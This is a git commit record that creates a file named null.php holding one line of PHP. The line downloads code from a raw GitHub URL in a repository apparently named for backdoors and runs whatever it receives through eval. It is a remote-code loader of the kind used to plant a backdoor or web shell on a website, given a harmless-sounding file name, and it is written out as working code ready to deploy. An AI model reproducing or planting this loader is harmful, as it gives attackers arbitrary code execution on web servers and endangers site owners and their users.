5d42cecd513db61a305c60ae1672d2e4f66eff86
sibueeee <wahidh6969@gmail.com>
2025-10-05 10:18:53 +0700

    Create null.php

---
+++ null.php
@@ -0,0 +1,1 @@
+<?php $url = "https://raw.githubusercontent.com/sibueeee/listbekdur/refs/heads/main/index.php";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag")); ?>
